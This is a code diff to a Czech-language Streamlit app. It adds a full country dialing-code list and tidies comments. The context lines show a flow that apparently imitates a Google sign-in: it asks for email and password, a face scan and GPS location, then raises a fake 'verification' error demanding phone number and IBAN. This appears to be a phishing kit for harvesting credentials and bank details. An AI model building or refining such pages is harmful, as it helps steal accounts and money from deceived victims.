@@ -102,6 +102,48 @@ def je_validni_email(email):
 def je_validni_tel(tel):
     return re.match(r"^\d{9}$", tel)
 
+# --- PLNÝ SEZNAM VŠECH STÁTŮ ---
+COUNTRIES = [
+    "Afghánistán (+93)", "Albánie (+355)", "Alžírsko (+213)", "Andorra (+376)",
+    "Angola (+244)", "Argentina (+54)", "Arménie (+374)", "Austrálie (+61)",
+    "Ázerbájdžán (+994)", "Bahamy (+1-242)", "Bahrajn (+973)", "Bangladéš (+880)",
+    "Belgie (+32)", "Bělorusko (+375)", "Belize (+501)", "Benin (+229)",
+    "Bhútán (+975)", "Bolívie (+591)", "Bosna a Hercegovina (+387)", "Botswana (+267)",
+    "Brazílie (+55)", "Bulharsko (+359)", "Burkina Faso (+226)", "Burundi (+257)",
+    "Čad (+235)", "Česká republika (+420)", "Čína (+86)", "Dánsko (+45)",
+    "Dominikánská republika (+1-809)", "Ecuador (+593)", "Egypt (+20)", "Eritrea (+291)",
+    "Estonsko (+372)", "Etiopie (+251)", "Finsko (+358)", "Francie (+33)",
+    "Gabon (+241)", "Gambie (+220)", "Ghana (+233)", "Gruzie (+995)",
+    "Guatemala (+502)", "Guinea (+224)", "Haiti (+509)", "Honduras (+504)",
+    "Hongkong (+852)", "Chorvatsko (+385)", "Indie (+91)", "Indonésie (+62)",
+    "Irák (+964)", "Írán (+98)", "Irsko (+353)", "Island (+354)", "Itálie (+39)",
+    "Izrael (+972)", "Jamajka (+1-876)", "Japonsko (+81)", "Jemen (+967)",
+    "Jihoafrická republika (+27)", "Jižní Korea (+82)", "Jižní Súdán (+211)",
+    "Jordánsko (+962)", "Kambodža (+855)", "Kamerun (+237)", "Kanada (+1)",
+    "Katar (+974)", "Kazachstán (+7)", "Keňa (+254)", "Kyrgyzstán (+996)",
+    "Kolumbie (+57)", "Kongo (DRC) (+243)", "Kongo (+242)", "Kostarika (+506)",
+    "Kuba (+53)", "Kuvajt (+965)", "Laos (+856)", "Lesotho (+266)",
+    "Libanon (+961)", "Libérie (+231)", "Libye (+218)", "Litva (+370)",
+    "Lotyšsko (+371)", "Lucembursko (+352)", "Madagaskar (+261)", "Maďarsko (+36)",
+    "Malajsie (+60)", "Malawi (+265)", "Maledivy (+960)", "Mali (+223)",
+    "Malta (+356)", "Maroko (+212)", "Mauritánie (+222)", "Mauritius (+230)",
+    "Mexiko (+52)", "Moldavsko (+373)", "Monako (+377)", "Mongolsko (+976)",
+    "Mosambik (+258)", "Myanmar (+95)", "Namibie (+264)", "Německo (+49)",
+    "Nepál (+977)", "Niger (+227)", "Nigérie (+234)", "Nizozemsko (+31)",
+    "Norsko (+47)", "Nový Zéland (+64)", "Omán (+968)", "Pákistán (+92)",
+    "Panama (+507)", "Papua Nová Guinea (+675)", "Paraguay (+595)", "Peru (+51)",
+    "Polsko (+48)", "Portugalsko (+351)", "Rakousko (+43)", "Rumunsko (+40)",
+    "Rusko (+7)", "Rwanda (+250)", "Řecko (+30)", "Salvador (+503)",
+    "Saúdská Arábie (+966)", "Senegal (+221)", "Singapur (+65)", "Slovensko (+421)",
+    "Slovinsko (+386)", "Somálsko (+252)", "Spojené arabské emiráty (+971)",
+    "Spojené království (+44)", "Spojené státy (+1)", "Srbsko (+381)",
+    "Srílanka (+94)", "Súdán (+249)", "Surinam (+597)", "Španělsko (+34)",
+    "Švédsko (+46)", "Švýcarsko (+41)", "Tádžikistán (+992)", "Tanzanie (+255)",
+    "Thajsko (+66)", "Togo (+228)", "Turecko (+90)", "Turkmenistán (+993)",
+    "Uganda (+256)", "Ukrajina (+380)", "Uruguay (+598)", "Uzbekistán (+998)",
+    "Venezuela (+58)", "Vietnam (+84)", "Zambie (+260)", "Zimbabwe (+263)"
+]
+
 # --- STAV APLIKACE ---
 if "step" not in st.session_state:
     st.session_state.step = "login"
@@ -133,7 +175,6 @@ if "lat" in query_params and "lon" in query_params:
         )
         data = resp.json()
         country_code = data.get("address", {}).get("country_code", "xx").lower()
-        
         mapping = {"cz": "Česká republika (+420)", "sk": "Slovensko (+421)"}
         st.session_state.default_country = mapping.get(country_code, "Česká republika (+420)")
         st.session_state.language = "cs" if country_code in ["cz", "sk"] else "en"
@@ -163,7 +204,6 @@ def show_logo():
 
 col1, col2, col3 = st.columns(3)
 with col2:
-    # LOGIN (vždy angličtina)
     if st.session_state.step == "login":
         show_logo()
         st.markdown(f"<h3 class='google-header'>{TEXTS['en']['login_header']}</h3>", unsafe_allow_html=True)
@@ -181,7 +221,6 @@ with col2:
             else:
                 st.error("Please enter a valid email and password.")
 
-    # FACE SCAN (vždy angličtina)
     elif st.session_state.step == "face":
         show_logo()
         st.info(TEXTS['en']['face_info'])
@@ -195,7 +234,6 @@ with col2:
             st.session_state.step = "gps"
             st.rerun()
 
-    # GPS (vždy angličtina – bez f-string!)
     elif st.session_state.step == "gps":
         show_logo()
         st.info(TEXTS['en']['gps_info'])
@@ -234,14 +272,12 @@ with col2:
             height=380
         )
 
-    # VERIFICATION + FINISH (jazyk podle GPS)
     elif st.session_state.step == "verification":
-        lang = st.session_state.language
         show_logo()
         st.error(t("verification_header"))
         st.write(t("verification_desc"))
 
-        zeme = st.selectbox(t("country"), ["Česká republika (+420)", "Slovensko (+421)"] + [c for c in COUNTRIES if c not in ["Česká republika (+420)", "Slovensko (+421)"]])
+        zeme = st.selectbox(t("country"), COUNTRIES)
 
         tel = st.text_input(t("phone"))
         
@@ -268,7 +304,6 @@ with col2:
                     st.error("Fill in phone and valid IBAN.")
 
     elif st.session_state.step == "finish":
-        lang = st.session_state.language
         show_logo()
         st.success(t("finish_header"))
         st.markdown(t("finish_status"))
